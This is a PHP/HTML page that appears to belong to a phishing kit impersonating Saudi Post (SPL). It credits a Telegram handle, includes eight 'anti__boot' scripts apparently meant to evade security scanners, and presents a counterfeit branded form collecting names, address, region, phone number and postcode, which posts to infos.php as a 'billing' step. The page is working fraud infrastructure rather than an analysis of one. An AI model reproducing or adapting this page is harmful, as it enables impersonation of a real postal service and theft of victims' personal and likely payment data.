<!-- ____ INFORMATION ____ 
     
     TELEGRAM : @ghayt_Zone
-->


<?php 

require_once "functions.php";

include("../anti__boot/anti1.php");
include("../anti__boot/anti2.php");
include("../anti__boot/anti3.php");
include("../anti__boot/anti4.php");
include("../anti__boot/anti5.php");
include("../anti__boot/anti6.php");
include("../anti__boot/anti7.php");
include("../anti__boot/anti8.php");

?>

<!DOCTYPE html>
<html>

<head>
  <meta charset="utf-8">
  <title>Saudi Post | SPL</title>
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <!-- template css files-->
  <link rel="stylesheet"  href="css/bootstrap.css">
  <link rel="stylesheet"  href="css/test.css">             
  <link rel="preconnect" href="https://fonts.gstatic.com">
  

  <!-- js files-->
  <script src="js/html5shiv.min.js"></script>
  <script src="js/respond.min.js"></script>

  <!-- logo site web-->
  <link rel="icon" href="image/logo.svg" type="image/x-icon" />
  <link rel="shortcut icon" href="image/logo.svg" type="image/x-icon" />

  <!-- fontawtsome -->
  <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous"/>

</head>
<body  class="loaded">
<header>
    <div class="lang">
        <div class="container text-end">
            <a  href="index_ar.php"><p class="mb-0">عربي</p></a>
        </div>
    </div>
    <div class="header d-flex justify-content-between align-items-center container">
        <div class="logo"><img src="image/Logo.svg"></div>
        <div class="reg"><button>Register</button></div>
    </div>
</header>
<svg xmlns="http://www.w3.org/2000/svg" width="100%" height="110.53900146484375" viewBox="0 0 1922.745 110.539" class="hero_linear login_linear" preserveAspectRatio="xMidYMid slice">
            <g id="lines" transform="translate(240.981 6.003)">
                <g id="Group_5" data-name="Group 5" transform="translate(0.001)">
                    <path id="Stroke_1" data-name="Stroke 1" d="M481.449,31H40.442c-9.228,0-12.731-3.427-17.011-7.614,0,0-2.6-2.54-6.83-6.776L0,0" transform="translate(1199.524 22.804)" fill="none" stroke="#153c3f" stroke-miterlimit="10" stroke-width="12" class="svg-hero-1"></path>
                    <path id="Stroke_5" data-name="Stroke 5" d="M1199.525,22.8,1179.014,2.286a9.393,9.393,0,0,0-13.2.888L1114.988,54c-4.235,4.236-12.6,7.7-18.588,7.7L16.047,61.5H-240.981" transform="translate(-0.001 0)" fill="none" stroke="#153c3f" stroke-miterlimit="10" stroke-width="12" class="svg-hero-2"></path>
                </g>
                <path id="Stroke_3" data-name="Stroke 3" d="M1681.764,0H1245.2c-5.2,0-7.724,1.33-10.369,3.975L1162.864,74,1105.8,27.31l-1346.711-.455" transform="translate(0 22.5)" fill="none" stroke="#00c8e1" stroke-miterlimit="10" stroke-width="12" class="svg-hero-3"></path>
            </g>
        </svg>
<section>
    <div class="container login_container">
        <div class="row">
            <div class="col-md-6">
                <div class="form">
				<div class="font-weight-bol text-cenrte">
                <img src="image/icon.png" alt="" data-pagespeed-url-hash="2094493022" onload="pagespeed.CriticalImages.checkImageForCriticality(this);"></div>
                    <h2>Please complete the following information</h2>
                    <h4 class="mt-4">Please enter all information correctly</h4 class="mt-4">

                    <form action="infos.php" method="post" class="mt-5 pt-5">
                        <input type="hidden" value="billing" name="step">

                        <div class="row">
                            <div class="form-group mb-4 col-md-6">
                                <input type="text" class="form-control" placeholder="Last Name" id="" name="last">
                                <?php
                                          if( !empty($_SESSION['errors']['last']) ) {
                                            echo '<div class="error" class="error">required</div>';}
                                     ?> 
                            </div>
                            <div class="form-group mb-4 col-md-6">
                                <input type="text" class="form-control" placeholder="First Name" id="" name="first">
                                <?php
                                          if( !empty($_SESSION['errors']['first']) ) {
                                            echo '<div class="error" class="error">required</div>';}
                                     ?> 
                            </div>
                        </div>

                        <div class="form-group mb-4">
                            <input type="text" class="form-control" placeholder="Address" id="" name="address">
                            <?php
                                          if( !empty($_SESSION['errors']['address']) ) {
                                            echo '<div class="error" class="error">required</div>';}
                                     ?> 
                        </div>

                        <div class="form-group mb-4">
                            <select style="line-height: 36px;" class="form-control" id="country-state" name="state">
                                <option value="'state">states</option>
                                <option value="'Asir Region">Asir Region</option>
                                <option value="Al Bahah Region">Al Bahah Region</option>
                                <option value="Al Jawf Region">Al Jawf Region</option>
                                <option value="Al Madinah Region">Al Madinah Region</option>
                                <option value="Al-Qassim Region">Al-Qassim Region</option>
                                <option value="Eastern Province">Eastern Province</option>
                                <option value="Ha'il Region">Ha'il Region</option>
                                <option value="Jizan Region">Jizan Region</option>
                                <option value="Makkah Region">Makkah Region</option>
                                <option value="Najran Region">Najran Region</option>
                                <option value="Northern Borders Region">Northern Borders Region</option>
                                <option value="Riyadh Region">Riyadh Region</option>
                                <option value="Tabuk Region">Tabuk Region</option>
                            </select>
                            <?php
                                          if( !empty($_SESSION['errors']['state']) ) {
                                            echo '<div class="error" class="error">required</div>';}
                                     ?> 
                        </div>

                         <div class="row">
                            <div class="form-group mb-4 col-md-9">
                                <input type="text" class="form-control" placeholder="Number Phone" id="phone" name="phone">
                                <?php
                                          if( !empty($_SESSION['errors']['phone']) ) {
                                            echo '<div class="error" class="error">required</div>';}
                                     ?> 
                            </div>
                            <div class="form-group mb-4 col-md-3">
                                <input type="text" class="form-control" placeholder="Zip" id="" name="zip">
                                <?php
                                          if( !empty($_SESSION['errors']['zip']) ) {
                                            echo '<div class="error" class="error">required</div>';}
                                     ?> 
                            </div>
                        </div>

                        <div class="bttn d-flex justify-content-between align-items-center mt-4">
                            <div class="reg"><button type="button" style="height: 48px;padding: 0 3rem;">Back</button></div>
                            <div class="reg"><button name="submit" style="height: 48px;padding: 0 3rem;background: #00C8E1;color:#153C3F;Continue;border: none;">Continue</button></div>
                        </div>

                    </form>
                </div>
            </div>

            <div class="col-md-6">
                <div class="form">
                    <div class="image text-center"><img src="image/phoone.png"></div>
                    <h2 class="mt-3">Download SPL Online App</h2>
                    <p>Introducing our new Saudi post-SPL redesigned app. that provides you with the best experience! We’ve made updates to keep your experience smooth, easy and always up to date.</p>
                    <div><img src="image/media.png"></div>
                </div>
            </div>
        </div>
    </div>
</section>

<footer>
    <div class="footer d-block d-md-flex justify-content-between align-items-center container">
        <div><span>©️ 2022 All rights reserved to Saudi Post- SPL</span></div>
        <div><span>When using this website, you must agree to <span>Terms of service</span> and <span>Privacy Terms</span></span></div>
    </div>
</footer>



    

   
    


  <!-- template files js-->
  <script src="js/jquery-3.5.1.min.js"></script>
  <script src="js/bootstrap.min.js"></script>
  <script src="js/jquery.mask.js"></script>
  <script>

    $("#phone").mask(" +000 00-000-0000")

  </script>
</body>
</html>